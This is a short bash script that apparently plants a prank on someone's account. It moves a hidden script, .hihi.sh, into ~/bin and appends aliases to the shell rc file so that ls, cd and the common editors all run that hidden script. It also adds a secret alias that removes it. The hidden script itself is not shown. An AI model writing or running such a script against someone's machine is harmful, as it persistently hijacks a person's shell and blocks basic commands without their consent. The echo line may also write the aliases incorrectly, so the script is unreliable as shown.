#!/bin/bash

mkdir -p ~/bin
mv .hihi.sh ~/bin/
chmod +x ~/bin/.hihi.sh
echo 'alias sl="sh ~/bin/.hihi.sh"\nalias ls="sl"\nalias cd="sl"\nalias vim="sl"\nalias vi="sl"\nalias nvim="sl"\nalias emacs="sl"\nalias nano="sl"\nalias ahmed_le_goat="rm -f ~/bin/.hihi.sh"' >> ~/.$(basename $SHELL)rc
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.$(basename $SHELL)rc
source ~/.$(basename $SHELL)rc
